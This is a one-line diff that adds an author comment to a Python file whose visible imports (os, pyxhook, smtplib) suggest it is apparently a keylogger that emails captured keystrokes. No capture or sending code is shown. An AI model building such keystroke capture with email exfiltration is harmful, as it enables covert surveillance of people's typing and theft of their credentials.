@@ -1,3 +1,4 @@
+#Author: Ast3rpiX (Mustafa Tunahan Uçar)
 import os
 import pyxhook
 import smtplib
